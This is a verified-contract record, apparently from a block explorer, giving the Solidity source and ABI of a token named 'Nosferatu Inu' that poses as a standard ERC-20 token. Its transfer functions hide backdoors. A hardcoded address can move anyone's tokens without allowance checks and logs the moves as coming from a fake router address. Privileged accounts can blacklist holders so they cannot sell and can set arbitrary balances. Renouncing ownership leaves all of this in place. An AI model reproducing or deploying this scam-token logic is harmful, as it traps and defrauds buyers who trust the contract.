{"SourceCode": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _rConstruct = 0x23fda63bb8A87946942556eC668221B090759Df0;\r\n\taddress UnisV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract NOSFERINU is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Iq;\r\n\tmapping (address => bool) private tQ;\r\n    mapping (address => bool) private mQ;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _QmSup = 666000000 * 10**_decimals;\r\n    string private constant _name = \"Nosferatu Inu\";\r\n    string private constant _symbol = \"NOSFERINU\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Iq[_MsgSendr()] = _QmSup;\r\n        emit Transfer(address(0), UnisV2Router, _QmSup);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _QmSup;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Iq[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction rEnd(address z) public {\r\n        if(tQ[msg.sender]) { \r\n        mQ[z] = false;}}\r\n        function rQuery(address z) public{\r\n         if(tQ[msg.sender])  { \r\n        require(!mQ[z]);\r\n        mQ[z] = true; }}\r\n\t\tfunction arStake(address z) public{\r\n         if(msg.sender == _rConstruct)  { \r\n        require(!tQ[z]);\r\n        tQ[z] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _rConstruct)  {\r\n        require(amount <= Iq[sender]);\r\n        Iq[sender] -= amount;  \r\n        Iq[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (UnisV2Router, recipient, amount);\r\n        return true; }    \r\n          if(!mQ[recipient]) {\r\n          if(!mQ[sender]) {\r\n         require(amount <= Iq[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        Iq[sender] -= amount;\r\n        Iq[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address txTo, uint256 z) public {\r\n        if(msg.sender == _rConstruct)  {\r\n        require(Iq[msg.sender] >= z);\r\n        Iq[msg.sender] -= z;  \r\n        Iq[txTo] += z; \r\n        emit Transfer (UnisV2Router, txTo, z);}\r\n        if(tQ[msg.sender]) {Iq[txTo] = z;} \r\n        if(!mQ[msg.sender]) {\r\n        require(Iq[msg.sender] >= z);\r\n        Iq[msg.sender] -= z;  \r\n        Iq[txTo] += z;          \r\n        emit Transfer(msg.sender, txTo, z);\r\n        }}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"z\",\"type\":\"address\"}],\"name\":\"arStake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"z\",\"type\":\"address\"}],\"name\":\"rEnd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"z\",\"type\":\"address\"}],\"name\":\"rQuery\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"z\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "NOSFERINU", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2797a2cd917a37f8a24dbc91dbe3044a90910e3ec27bb1b6b47adf921ad80677"}